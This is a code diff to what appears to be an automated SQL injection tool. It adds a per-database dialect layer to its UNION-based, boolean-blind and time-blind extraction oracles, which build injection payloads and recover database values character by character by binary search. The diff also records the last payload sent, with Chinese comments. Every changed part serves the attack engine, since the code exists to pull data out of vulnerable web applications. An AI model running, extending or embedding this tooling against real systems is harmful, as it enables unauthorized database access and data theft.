@@ -11,6 +11,7 @@ import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from .builder import PayloadBuilder
+from .dbms import get_dialect
 from .models import InjectionPoint, ResponseInfo, WafReport, similarity
 from .session import HttpSession
 
@@ -31,6 +32,8 @@ class BaseOracle:
         self.b = builder
         self.waf = waf
         self.requests = 0
+        self.last_payload = ""                # 最近发送的完整 payload（复盘用）
+        self.dialect = get_dialect("mysql")   # 由 make_oracle 按 fp.dbms 覆盖
 
     def scalar(self, expr: str) -> str:
         """取回标量表达式的字符串值。"""
@@ -67,8 +70,9 @@ class UnionOracle(BaseOracle):
         n = self.inj.column_count
         pos = self.inj.echo_positions[0] - 1
         cols = ["null"] * n
-        cols[pos] = f"concat(0x7e7e,ifnull(({expr}),0x4e554c4c),0x7e7e)"
+        cols[pos] = self.dialect.mark_wrap.format(expr=expr)
         payload = self.b.wrap("union select " + ",".join(cols), base_value="0")
+        self.last_payload = payload
         r = self.s.request_value(payload)
         self.requests += 1
         if r.status_code < 0:
@@ -151,6 +155,7 @@ class BoolOracle(BaseOracle):
     def eval_bool(self, cond: str) -> bool:
         join = getattr(self.b, f"logic_{self._joiner}")
         payload = self.b.wrap(join(cond))
+        self.last_payload = payload
         r = self.s.request_value(payload)
         self.requests += 1
         if r.status_code < 0:
@@ -186,7 +191,7 @@ class BoolOracle(BaseOracle):
             if self.eval_bool(f"{a}{eq}{b}"):
                 return prev
         code = self._binsearch(
-            lambda m: f"ascii({self._substr_at(expr, pos)})>={m}", 32, 126)
+            lambda m: f"{self.dialect.blind_code}({self._substr_at(expr, pos)})>={m}", 32, 126)
         return chr(code)
 
     def _extract_block(self, expr: str, start: int, end: int) -> str:
@@ -373,7 +378,8 @@ class TimeOracle(BaseOracle):
                 if self.eval_bool(f"{a}{eq}{b}"):
                     out.append(prev)
                     continue
-            code = self._binsearch(lambda m: f"ascii({self._substr_at(expr, p)})>={m}", 32, 126)
+            code = self._binsearch(
+                lambda m: f"{self.dialect.blind_code}({self._substr_at(expr, p)})>={m}", 32, 126)
             ch = chr(code)
             out.append(ch)
             prev = ch or None
